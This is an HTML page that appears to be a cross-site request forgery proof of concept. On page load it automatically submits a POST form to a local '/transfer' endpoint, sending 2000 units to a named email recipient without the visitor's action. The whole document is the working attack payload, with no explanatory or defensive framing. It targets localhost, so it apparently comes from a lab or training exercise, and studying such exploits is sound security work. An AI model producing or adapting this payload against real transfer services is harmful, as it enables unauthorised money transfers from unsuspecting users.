<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Automatic Form Submission</title>
</head>
<body onload="document.forms[0].submit();">
<form action="http://127.0.0.1:8080/transfer" method="POST">
    <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="n@gmail.com"/>
    <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" value=2000/>
    <button type="submit" class="btn btn-primary">Send the Money!</button>
</form>

</body>
</html>
